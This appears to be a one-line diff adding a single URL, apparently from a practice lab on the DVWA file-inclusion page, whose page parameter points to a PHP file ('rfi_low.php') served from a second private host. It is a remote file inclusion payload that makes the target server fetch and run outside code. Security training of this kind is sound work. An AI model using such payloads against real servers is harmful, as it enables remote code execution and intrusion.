@@ -1,0 +1,1 @@
+http://192.168.56.105:8080/vulnerabilities/fi/?page=http://192.168.56.101:8000/rfi_low.php
